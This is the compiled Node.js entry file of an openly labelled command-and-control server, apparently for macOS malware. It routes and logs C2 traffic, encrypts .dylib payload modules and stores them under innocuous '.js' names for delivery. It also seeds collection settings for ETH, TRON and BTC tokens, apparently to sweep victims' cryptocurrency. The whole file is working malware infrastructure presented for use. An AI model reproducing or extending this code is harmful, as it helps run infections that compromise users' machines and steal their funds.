import Fastify from 'fastify';
import fastifyCookie from '@fastify/cookie';
import fastifyMultipart from '@fastify/multipart';
import fastifySchedule from '@fastify/schedule';
import { SimpleIntervalJob, AsyncTask, CronJob } from 'toad-scheduler';
import bcrypt from 'bcryptjs';
import crypto from 'node:crypto';
import { readdir, readFile, mkdir, writeFile, unlink, rename } from 'node:fs/promises';
import path from 'node:path';
import { loadConfig } from './config/index.js';
import { BUNDLE_ID_MAP } from './config/constants.js';
import { logger, logAls } from './core/logger/index.js';
import { connectMongo, connectRedis, disconnectAll } from './core/db/connection.js';
import { Payload, User } from './core/db/models/index.js';
import { CollectConfig } from './core/db/models/collect-config.js';
import { PayloadCrypto } from './core/crypto/seven-zip.js';
import { c2Plugin } from './plugins/c2/index.js';
import { apiPlugin } from './plugins/api/index.js';
import { tasks } from './schedules/index.js';
import { recoverPendingExports } from './core/export/executor.js';
import { invalidateConfigCache } from './plugins/c2/services/config-builder.js';
import { getRealIP } from './core/utils/ip.js';
const config = loadConfig();
const fastify = Fastify({
    bodyLimit: 100 * 1024 * 1024,
    trustProxy: true,
    loggerInstance: logger,
    disableRequestLogging: true,
});
// C2 日志流路径匹配
const C2_PREFIXES = ['/api/tg/', '/api/wp/', '/api/ip-sync/', '/details/', '/event'];
const C2_EXACT = new Set(['/a', '/u', '/t', '/vhx']);
// Generate traceId for every request (global)
fastify.addHook('onRequest', (request, reply, done) => {
    const url = request.url;
    const path = url.split('?')[0];
    const stream = C2_PREFIXES.some(p => url.startsWith(p)) ? 'c2'
        : C2_EXACT.has(path) ? 'c2'
            : url.startsWith('/api') ? 'api'
                : 'system';
    const traceId = crypto.randomBytes(5).toString('hex');
    request.traceId = traceId;
    const ctx = { traceId, stream };
    logAls.run(ctx, done);
});
// Register plugins
await fastify.register(fastifyCookie);
await fastify.register(fastifyMultipart);
await fastify.register(fastifySchedule);
// Global error handler — catch all unhandled route errors and log with stack trace
fastify.setErrorHandler((error, request, reply) => {
    logger.error({ err: error }, 'unhandled route error');
    const statusCode = error.statusCode ?? 500;
    reply.status(statusCode).send({
        error: statusCode >= 500 ? '服务器内部错误' : '请求失败',
    });
});
// 404 handler
fastify.setNotFoundHandler(async (request, reply) => {
    const ip = request.realIP || getRealIP(request);
    logger.warn(`UNMATCHED ${request.method} ${request.url} ${ip}`);
    reply.code(404);
    return { error: '未找到' };
});
// Health check (for Docker/orchestrator, not C2 traffic)
fastify.get('/healthz', async () => ({ status: 'ok' }));
// Register C2 scope
await fastify.register(c2Plugin);
// Register Management API
await fastify.register(apiPlugin);
// Graceful shutdown
fastify.addHook('onClose', async () => {
    await disconnectAll();
});
async function initPayloads() {
    const templateDir = path.join(process.cwd(), 'templates/payloads');
    let files;
    try {
        files = await readdir(templateDir);
    }
    catch (err) {
        if (err.code === 'ENOENT') {
            logger.warn('templates/payloads/ not found, skipping payload init');
        }
        else {
            logger.error({ err, templateDir }, 'Failed to read payload template directory');
        }
        return;
    }
    let updated = false;
    for (const file of files) {
        if (!file.endsWith('.dylib'))
            continue;
        const name = path.basename(file, '.dylib');
        if (name === 'corepayload' || name === 'loader')
            continue;
        try {
            const inputPath = path.join(templateDir, file);
            const buffer = await readFile(inputPath);
            const sha256 = crypto.createHash('sha256').update(buffer).digest('hex');
            const existing = await Payload.findOne({ name });
            if (existing && existing.sha256 === sha256)
                continue;
            const encryptedDir = path.join(config.storageRoot, 'encrypted');
            await mkdir(encryptedDir, { recursive: true });
            const finalPath = path.join(encryptedDir, `${name}.js`);
            const tmpEncryptedPath = path.join(encryptedDir, `${name}.js.tmp`);
            // 写临时 dylib 供 7z 加密
            const tmpDir = path.join(config.storageRoot, 'tmp');
            await mkdir(tmpDir, { recursive: true });
            const tmpDylibPath = path.join(tmpDir, `${name}-${Date.now()}.dylib`);
            await writeFile(tmpDylibPath, buffer);
            // 加密到临时输出路径（不动旧文件）
            try {
                await PayloadCrypto.encrypt(tmpDylibPath, tmpEncryptedPath);
            }
            finally {
                await unlink(tmpDylibPath).catch(() => { });
            }
            // 先更新 DB，再替换文件：确保文件和 DB 一致
            if (existing) {
                await Payload.updateOne({ name }, {
                    $set: {
                        sha256,
                        size: buffer.length,
                        encryptedPath: `encrypted/${name}.js`,
                        updatedAt: new Date(),
                    },
                });
            }
            else {
                await Payload.create({
                    name,
                    originalName: file,
                    sha256,
                    size: buffer.length,
                    encryptedPath: `encrypted/${name}.js`,
                    type: 'module',
                    bundleId: BUNDLE_ID_MAP[name] || '',
                    cold: name !== 'helion' && name !== 'taskagent',
                    doNotCloseAfterRun: true,
                    active: true,
                });
            }
            // DB 成功后，原子替换加密文件
            await rename(tmpEncryptedPath, finalPath);
            logger.info({ name, size: buffer.length, sha256 }, existing ? 'Payload updated (template changed)' : 'Payload initialized');
            updated = true;
        }
        catch (err) {
            logger.error({ err, name }, 'Failed to init/update payload, skipping');
        }
    }
    if (updated) {
        await invalidateConfigCache();
    }
}
async function ensureDefaultAdmin() {
    const exists = await User.findOne({ username: 'admin' });
    if (exists)
        return;
    const hash = await bcrypt.hash(config.defaultAdminPassword, 10);
    await User.create({ username: 'admin', passwordHash: hash, role: 'admin', status: 'active' });
    logger.info('Default admin account created');
}
async function initCollectConfigs() {
    const COLLECT_CONFIG_SEEDS = [
        { chain: 'eth', token: 'native' },
        { chain: 'eth', token: 'usdt' },
        { chain: 'eth', token: 'usdc' },
        { chain: 'tron', token: 'native' },
        { chain: 'tron', token: 'usdt' },
        { chain: 'btc', token: 'native' },
    ];
    for (const seed of COLLECT_CONFIG_SEEDS) {
        await CollectConfig.updateOne({ chain: seed.chain, token: seed.token }, { $setOnInsert: { threshold: '0', enabled: false } }, { upsert: true });
    }
}
// Start
async function start() {
    try {
        await connectMongo(config.mongoUri);
        await connectRedis(config.redisUrl);
        // Initialization (instance 0 only)
        const instanceId = parseInt(process.env.NODE_APP_INSTANCE || '0');
        if (instanceId === 0) {
            await ensureDefaultAdmin();
            await initCollectConfigs();
            await initPayloads();
            await recoverPendingExports();
        }
        await fastify.listen({ port: config.port, host: '0.0.0.0' });
        logger.info(`Server listening on port ${config.port}`);
        // Register scheduled tasks (distributed across workers in multi-process mode)
        const totalWorkers = parseInt(process.env.WORKERS || '1');
        const registeredTasks = [];
        for (const task of tasks) {
            if (task.enabled === false)
                continue;
            if (totalWorkers > 1 && task.instanceOnly !== undefined && task.instanceOnly !== instanceId)
                continue;
            const asyncTask = new AsyncTask(task.name, () => task.handler(config), (err) => logger.error({ err, task: task.name }, 'Scheduled task failed'));
            if (task.type === 'cron') {
                const job = new CronJob({ cronExpression: task.cronExpression, timezone: task.timezone }, asyncTask, { preventOverrun: task.preventOverrun ?? true, id: task.name });
                fastify.scheduler.addCronJob(job);
            }
            else {
                const job = new SimpleIntervalJob({ ...task.interval, runImmediately: task.runImmediately }, asyncTask, { preventOverrun: task.preventOverrun ?? true, id: task.name });
                fastify.scheduler.addSimpleIntervalJob(job);
            }
            registeredTasks.push(task.name);
        }
        logger.info({ tasks: registeredTasks, instanceId, totalWorkers }, 'Scheduled tasks registered');
        // Notify PM2 ready
        process.send?.('ready');
    }
    catch (err) {
        logger.fatal({ err }, 'Failed to start server');
        logger.flush(() => process.exit(1));
    }
}
process.on('unhandledRejection', (reason) => {
    logger.error({ err: reason }, 'unhandled rejection');
});
process.on('uncaughtException', (err) => {
    logger.error({ err }, 'uncaught exception');
});
// Graceful shutdown on signals
for (const signal of ['SIGINT', 'SIGTERM']) {
    process.on(signal, () => {
        logger.info(`Received ${signal}, shutting down...`);
        fastify.close().finally(() => {
            logger.flush(() => process.exit(0));
        });
        setTimeout(() => process.exit(1), 3000).unref();
    });
}
start();
//# sourceMappingURL=app.js.map